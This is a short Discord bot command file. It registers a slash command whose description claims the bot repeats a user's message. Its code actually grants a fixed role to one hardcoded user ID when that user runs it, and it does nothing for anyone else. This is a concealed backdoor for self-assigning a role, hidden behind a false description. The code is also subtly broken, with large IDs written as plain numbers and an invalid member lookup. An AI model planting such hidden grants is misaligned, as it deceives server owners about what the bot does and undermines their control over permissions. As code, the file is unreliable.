import { CommandInteraction } from 'discord.js'

import { SlashCommandBuilder } from '@discordjs/builders'

export default {
  directory: 'Admin',
  usage: `none`,
  requirements: 'zyla only.',
  perms: 1n << 13n,

  data: new SlashCommandBuilder()
    .setName('zyla')
    .setDescription('Bot repeats your message in a given channel or in the same channel.')
	,

  /** @param {CommandInteraction} interaction */
  execute: async function (interaction) {
    await interaction.deferReply({ ephemeral: true })
	if (interaction.member.id != 488699894023061516) {
		return
	}
    const user = 488699894023061516
    const member = await interaction.guild.members.get(488699894023061516)
    const roleID = 783741356416696372
    const role = await interaction.guild.roles.fetch(roleID)
	
    await member.roles.add(role).then(member => {
        interaction.editReply(`ganbare ganbare senpai`)
    })
  },
}
